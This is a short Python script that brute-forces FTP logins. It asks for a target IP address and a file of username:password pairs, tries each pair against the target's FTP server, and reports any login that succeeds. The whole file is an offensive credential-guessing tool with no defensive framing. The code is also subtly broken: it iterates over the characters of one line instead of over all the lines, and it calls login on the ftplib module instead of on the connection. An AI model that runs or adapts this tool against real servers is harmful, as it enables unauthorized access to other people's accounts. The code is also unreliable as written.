import ftplib #ftp library
from termcolor import colored

def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, 'r')
    except:
        print("[!!] File doesn't exist")
    for line in pF.readline():
        userName = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print(colored("[$] Trying: "+userName+"/"+password, 'yellow'))
        try:
            ftp = ftplib.FTP(hostname)
            login = ftplib.login(userName,password)
            print(colored("[+] Login succeeded with "+userName+"/"+password, 'green'))
            ftp.quit()
            return(userName,password)
        except:
            pass
    print(colored("[-] Password not in list", 'red'))

host = input("[*] Enter Targets IP Address: ")
passwdFile = input("[*] Enter User/Password file path: ")
bruteLogin(host, passwdFile)